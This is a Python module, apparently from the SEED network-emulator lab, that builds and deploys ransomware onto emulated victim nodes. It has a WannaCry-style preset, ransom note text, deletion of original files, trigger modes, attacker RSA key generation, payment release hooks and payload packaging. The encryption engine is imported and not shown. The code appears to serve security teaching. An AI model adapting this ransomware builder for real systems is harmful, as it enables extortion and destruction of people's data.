"""Build time: configure a ransomware and ship it (direct install or as a payload).

    ransom = (Ransomware.preset("wannacry")
              .setTargets(["/home/seed/Documents"])
              .setPayment(payment))
    ransom.install("victim1")          # direct install (manual trigger by default)
    pkg = ransom.asPayload()           # or hand it to a carrier (contract 2)

The attacker RSA keypair is generated here, once per Ransomware object:
attacker_pub goes into the payload's settings, attacker_priv only into the
attacker-side release tool that the payment watcher runs (contract 3).
"""

from pathlib import PurePosixPath

from seedemu.core import Server, Service

from software.core import install
from software.ransomware.runtime import crypto
from software.ransomware.runtime.engine import ATTACKER_PIECE, PIECE, SCHEMES
from software.ransomware.runtime.targets import EXTENSION_PRESETS

TRIGGERS = ("manual", "on_arrival", "delay")

PRESETS = {
    "wannacry": {
        "family": "WannaCry",
        "scheme": "wannacry",
        "suffix": ".WNCRY",
        "magic": "WANACRY!",
        "extensions": "wannacry",
        "delete_originals": True,
        "note_filename": "@Please_Read_Me@.txt",
        "note_text": (
            "Ooops, your important files are encrypted.\n\n"
            "Your documents in ${folders} were encrypted by ${family} and now end in ${suffix}.\n"
            "To get them back, open the recovery program:\n\n    ${menu_cmd}\n\n"
            "Price: ${price}. Pay on chain ${chain_id}, receive your key, then run:\n\n"
            "    ${decrypt_cmd}\n"
        ),
        "countdown_hours": None,
    },
    "simple": {
        "family": "Ransomware",
        "scheme": "simple",
        "suffix": ".locked",
        "magic": "YOMLOCK1",
        "extensions": None,
        "delete_originals": True,
        "note_filename": "README_RECOVER.txt",
        "note_text": "Your files in ${folders} were encrypted (${suffix}). Run: ${menu_cmd}\n",
        "countdown_hours": None,
    },
}

COMMANDS = {
    "menu": "yom-ransomware menu",
    "decrypt": "yom-ransomware decrypt",
    "detonate": "yom-ransomware detonate",
}
LAUNCHERS = {"yom-ransomware": "software.ransomware.runtime.main"}
RELEASE_LAUNCHERS = {"yom-ransomware-release": "software.ransomware.runtime.release"}


class Ransomware:
    def __init__(self, family: str = "Ransomware", scheme: str = "simple"):
        self._family = family
        self._scheme = scheme
        self._folders = []
        self._extensions = None
        self._exclude = []
        self._suffix = ".locked"
        self._magic = "YOMLOCK1"
        self._delete = True
        self._trigger = {"mode": "manual"}
        self._note = {"filename": None, "text": ""}
        self._ui = {"title": "SEED INCIDENT LAB",
                    "subtitle": "Participant workspace / wallet and document exercises"}
        self._countdown = None
        self._payment = None
        self._keys = None
        self._service = None

    # ---- presets and setters (all chainable) ------------------------------
    @classmethod
    def preset(cls, name: str) -> "Ransomware":
        if name not in PRESETS:
            raise ValueError(f"unknown preset {name}; choose from {sorted(PRESETS)}")
        p = PRESETS[name]
        r = cls(p["family"], p["scheme"])
        r.setSuffix(p["suffix"]).setMagic(p["magic"]).setExtensions(p["extensions"])
        r.keepOriginals(not p["delete_originals"])
        r.setNote(p["note_filename"], p["note_text"]).setCountdown(p["countdown_hours"])
        return r

    def setFamily(self, family: str):
        self._family = family
        return self

    def setScheme(self, scheme: str):
        if scheme not in SCHEMES:
            raise ValueError(f"unknown key scheme {scheme}; choose from {SCHEMES}")
        self._scheme = scheme
        return self

    def setTargets(self, folders):
        for folder in folders:
            if not PurePosixPath(folder).is_absolute():
                raise ValueError(f"target folders must be absolute container paths: {folder}")
        self._folders = list(folders)
        return self

    def setExtensions(self, extensions):
        """A preset name ("wannacry"), a list (".txt", ...), or None = every file."""
        if isinstance(extensions, str):
            if extensions not in EXTENSION_PRESETS:
                raise ValueError(f"unknown extension preset {extensions}")
            extensions = EXTENSION_PRESETS[extensions]
        self._extensions = None if extensions is None else [e.lower() for e in extensions]
        return self

    def addExtensions(self, extensions):
        if self._extensions is None:
            return self
        for ext in extensions:
            if not ext.startswith("."):
                raise ValueError(f"extensions start with a dot: {ext}")
            if ext.lower() not in self._extensions:
                self._extensions.append(ext.lower())
        return self

    def setExclude(self, patterns):
        self._exclude = list(patterns)
        return self

    def setSuffix(self, suffix: str):
        if not suffix.startswith(".") or "/" in suffix:
            raise ValueError("the suffix must look like .WNCRY")
        self._suffix = suffix
        return self

    def setMagic(self, magic: str):
        magic.encode("ascii")
        if not 4 <= len(magic) <= 16:
            raise ValueError("magic must be 4..16 ASCII characters")
        self._magic = magic
        return self

    def keepOriginals(self, keep: bool = True):
        self._delete = not keep
        return self

    def setTrigger(self, mode: str, seconds: float = 0):
        if mode not in TRIGGERS:
            raise ValueError(f"unknown trigger {mode}; choose from {TRIGGERS}")
        self._trigger = {"mode": mode, "seconds": seconds}
        return self

    def setNote(self, filename, text: str):
        """Note text may use ${family} ${suffix} ${folders} ${folder} ${menu_cmd}
        ${decrypt_cmd} ${price} ${chain_id} ${countdown_hours}."""
        if filename is not None and "/" in filename:
            raise ValueError("the note filename is a plain name, written into each target folder")
        self._note = {"filename": filename, "text": text}
        return self

    def setUi(self, title: str = None, subtitle: str = None):
        if title:
            self._ui["title"] = title
        if subtitle:
            self._ui["subtitle"] = subtitle
        return self

    def setCountdown(self, hours):
        self._countdown = hours
        return self

    def setPayment(self, payment):
        """Attach a RansomPayment (contract 3). Payment screens appear in the UI."""
        self._payment = payment
        payment.setReleaseTool(self.attackerPackage(), ["yom-ransomware-release"])
        return self

    # ---- packages -----------------------------------------------------------
    def _attacker_keys(self) -> dict:
        if self._keys is None:
            self._keys = crypto.new_attacker_keys()
        return self._keys

    def settings(self, emulator=None) -> dict:
        if not self._folders:
            raise ValueError("call setTargets([...]) before installing the ransomware")
        exclude = list(self._exclude)
        if self._note["filename"] and self._note["filename"] not in exclude:
            exclude.append(self._note["filename"])
        return {
            "family": self._family,
            "scheme": self._scheme,
            "suffix": self._suffix,
            "magic": self._magic,
            "attacker_pub_pem": self._attacker_keys()["attacker_pub_pem"],
            "delete_originals": self._delete,
            "targets": {"folders": self._folders, "extensions": self._extensions,
                        "exclude": exclude, "recursive": True},
            "note": dict(self._note),
            "ui": dict(self._ui),
            "countdown_hours": self._countdown,
            "trigger": dict(self._trigger),
            "payment": self._payment is not None,
            "commands": dict(COMMANDS),
            "needs": list(install.BASE_NEEDS),
        }

    def asPayload(self):
        """The Payload Package (contract 2). Start command: ``yom-ransomware arm``."""
        pieces = ["ransomware"]
        pkg = install.package("ransomware", pieces, settings={PIECE: self.settings},
                              launchers=LAUNCHERS, start="yom-ransomware arm")
        if self._payment is not None:
            pkg.merge(self._payment.clientPackage())
        return pkg

    def attackerPackage(self):
        """attacker_priv + the release command; installed next to the watcher."""
        return install.package("ransomware_attacker", ["ransomware"],
                               settings={ATTACKER_PIECE: self._attacker_keys()},
                               launchers=RELEASE_LAUNCHERS)

    # ---- direct install (no carrier) -------------------------------------------
    def install(self, vnode: str):
        """Install on a victim vnode through the seedemu Service below."""
        if self._service is None:
            self._service = RansomwareService(self)
        return self._service.install(vnode)

    def service(self):
        """The seedemu layer to add with ``emu.addLayer(...)``."""
        if self._service is None:
            self._service = RansomwareService(self)
        return self._service


class RansomwareServer(Server):
    def __init__(self, builder: Ransomware):
        super().__init__()
        self.builder = builder
        self.emulator = None

    def install(self, node):
        install.install_package(self.emulator, node, self.builder.asPayload())


class RansomwareService(Service):
    def __init__(self, builder: Ransomware):
        super().__init__()
        self.builder = builder
        self.addDependency("Base", False, False)

    def getName(self) -> str:
        return "Ransomware"

    def _createServer(self) -> Server:
        return RansomwareServer(self.builder)

    def render(self, emulator):
        for server, _ in self.getTargets():
            server.emulator = emulator
        super().render(emulator)
